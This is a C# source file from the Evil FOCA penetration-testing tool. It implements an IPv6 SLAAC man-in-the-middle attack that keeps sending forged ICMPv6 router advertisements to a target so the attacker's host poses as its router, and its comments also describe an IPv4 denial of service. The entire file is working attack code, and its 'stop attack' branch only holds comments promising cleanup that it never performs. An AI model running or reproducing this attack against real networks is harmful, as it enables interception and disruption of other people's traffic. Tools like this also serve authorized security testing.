/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using PacketDotNet;
using PacketDotNet.Utils;
using SharpPcap.WinPcap;
using System.Collections.Generic;

namespace evilfoca.Attacks
{
    /// <summary>
    /// Realiza una denegacion de servicio IPv4 a los objetivos y realiza un MITM entre ambos mediante IPv6 utilizando SLAAC
    /// </summary>
    class SlaacMITM
    {
        private const int SendPacketEachXSecs = 4;

        private WinPcapDevice device;
        private Thread threadAttack;
        private IList<Data.Attack> attacks;
        public static PhysicalAddress invalidMac;

        public SlaacMITM(WinPcapDevice device, IList<Data.Attack> attacks)
        {
            this.device = device;
            this.attacks = attacks;

            invalidMac = PhysicalAddress.Parse("00-00-00-00-00-00");
        }

        public void Start()
        {
            threadAttack = new Thread(new ThreadStart(Attack));
            threadAttack.IsBackground = true;
            threadAttack.Start();
        }

        private void Attack()
        {
            while (true)
            {
                try
                {

                    /* INICIAR EL ATAQUE MODIFICANDO LA CACHE ARP (DoS IPv4) Y LAS TABLAS DE VECINOS (IPv6 SLAAC) */
                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.SlaacMitm && A.attackStatus == Data.AttackStatus.Attacking))
                    {
                        if (attack is evilfoca.Data.MitmAttack)
                        {
                            evilfoca.Data.MitmAttack slaacMitm = (evilfoca.Data.MitmAttack)attack;
                            EthernetPacket ethernet;

                            {
                                IPAddress myIP = Program.CurrentProject.data.GetIPv6LocalLinkFromDevice(Program.CurrentProject.data.GetDevice());
                                PhysicalAddress myMac = Program.CurrentProject.data.GetDevice().MacAddress;

                                // IPv6 (de vinculo local) y MAC atacada
                                IPAddress IPdst = slaacMitm.t2.ip;
                                PhysicalAddress MACdst = slaacMitm.t2.mac;

                                ICMPv6Packet routerAdvertisement = new ICMPv6Packet(new ByteArraySegment(new ICMPv6.NeighborRouterAdvertisement(myMac, slaacMitm.prefix, false).GetBytes()));
                                IPv6Packet ipv6 = new IPv6Packet(myIP, IPdst);
                                ipv6.PayloadPacket = routerAdvertisement;
                                ipv6.HopLimit = 255;

                                ethernet = new EthernetPacket(myMac, MACdst, EthernetPacketType.IpV6);
                                ethernet.PayloadPacket = ipv6;
                                Program.CurrentProject.data.SendPacket(ethernet);

                            }

                        }
                    }

                    /* PARAR ATAQUE Y RESTAURAR LA CACHE DNS Y TABLAS DE VECINOS */
                    foreach (Data.Attack attack in attacks.Where(A => A.attackType == Data.AttackType.SlaacMitm && A.attackStatus == Data.AttackStatus.Stopping))
                    {
                        if (attack is evilfoca.Data.MitmAttack)
                        {
                            evilfoca.Data.MitmAttack slaacMitm = (evilfoca.Data.MitmAttack)attack;

                            /* Enviar paquetes para que pare la denegacion de servicio IPv4 */

                            /* Enviar paquetes para que pare el envenenamiento de vecino IPv6 */

                            attack.attackStatus = Data.AttackStatus.Stop;
                        }
                    }


                    Thread.Sleep(SendPacketEachXSecs * 1000);
                }
                catch
                {

                }


            }
        }
    }
}
